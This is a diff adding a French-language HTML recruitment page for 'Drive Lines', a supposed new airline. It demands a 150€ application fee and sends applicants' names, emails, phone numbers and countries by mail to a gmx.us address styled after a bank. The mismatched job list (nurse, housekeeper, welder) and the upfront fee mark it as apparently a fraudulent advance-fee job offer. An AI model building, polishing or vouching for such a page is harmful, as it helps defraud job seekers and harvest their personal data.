@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recrutement Drive Lines</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #8B4513; /* Fond marron */
+            color: #ffffff; /* Texte blanc */
+        }
+        header {
+            text-align: center;
+            padding: 20px;
+            background-color: #5A3318; /* Marron plus foncé pour l'en-tête */
+            margin-bottom: 20px;
+        }
+        header h1 {
+            margin: 0;
+        }
+        main {
+            width: 90%;
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #ffffff; /* Fond blanc pour le contenu */
+            color: #000000; /* Texte noir pour le contraste */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        h2, p {
+            text-align: center;
+        }
+        form {
+            margin-top: 20px;
+        }
+        label {
+            display: block;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        input, select, textarea, button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        button {
+            background-color: #5A3318; /* Marron pour le bouton */
+            color: #ffffff;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #8B4513; /* Couleur marron plus claire au survol */
+        }
+        .contact-info {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .contact-info a {
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .fixed-info {
+            background-color: #F5F5DC; /* Beige clair */
+            color: #000000;
+            text-align: center;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-weight: bold;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Bienvenue chez Drive Lines</h1>
+    </header>
+    <main>
+        <div class="fixed-info">
+            Frais de dossier : 150€
+        </div>
+        <h2>Rejoignez notre équipe dynamique !</h2>
+        <p>
+            Nous sommes ravis de vous annoncer l'ouverture des recrutements pour notre nouvelle société aérienne <b>Drive Lines</b>.
+            Que vous soyez à la recherche d'un emploi ou d'une nouvelle opportunité, nous avons une place pour vous. 
+            Inscrivez-vous dès maintenant et faites partie d'une entreprise qui valorise le talent et la passion.
+        </p>
+        <p>Postulez pour l'un de nos nombreux postes ci-dessous. Nous avons hâte de vous accueillir parmi nous !</p>
+
+        <form action="mailto:singl-bankbnp@gmx.us" method="POST" enctype="text/plain">
+            <label for="name">Nom complet :</label>
+            <input type="text" id="name" name="Nom" placeholder="Entrez votre nom complet" required>
+
+            <label for="email">Adresse e-mail :</label>
+            <input type="email" id="email" name="Email" placeholder="Entrez votre adresse e-mail" required>
+
+            <label for="phone">Numéro de téléphone :</label>
+            <input type="tel" id="phone" name="Téléphone" placeholder="Entrez votre numéro de téléphone (incluez l'indicatif pays)" required>
+
+            <label for="country">Pays d'origine :</label>
+            <input type="text" id="country" name="Pays" placeholder="Entrez votre pays d'origine" required>
+
+            <label for="poste">Poste souhaité :</label>
+            <select id="poste" name="Poste" required>
+                <option value="">-- Sélectionnez un poste --</option>
+                <option value="Secrétaire">Secrétaire</option>
+                <option value="Infirmier/Infirmière">Infirmier/Infirmière</option>
+                <option value="Comptable">Comptable</option>
+                <option value="Chauffeur">Chauffeur</option>
+                <option value="Ingénieur">Ingénieur</option>
+                <option value="Agriculture">Agriculture</option>
+                <option value="Ménagères">Ménagères</option>
+                <option value="Électricien bâtiment">Électricien bâtiment</option>
+                <option value="Enseignant/Enseignante">Enseignant/Enseignante</option>
+                <option value="Gardiennage">Gardiennage</option>
+                <option value="Mécanique">Mécanique</option>
+                <option value="Soudeur">Soudeur</option>
+                <option value="Menuisier">Menuisier</option>
+                <option value="Traducteur">Traducteur</option>
+                <option value="Gestionnaire">Gestionnaire</option>
+                <option value="Autres">Autres</option>
+            </select>
+
+            <label for="message">Message ou motivation :</label>
+            <textarea id="message" name="Message" rows="5" placeholder="Expliquez pourquoi vous postulez pour ce poste" required></textarea>
+
+            <button type="submit">Envoyer la candidature</button>
+        </form>
+
+        <div class="contact-info">
+            <p>Pour toute question, veuillez nous contacter par email :
+                <a href="mailto:singl-bankbnp@gmx.us">singl-bankbnp@gmx.us</a>
+            </p>
+        </div>
+    </main>
+</body>
+</html>
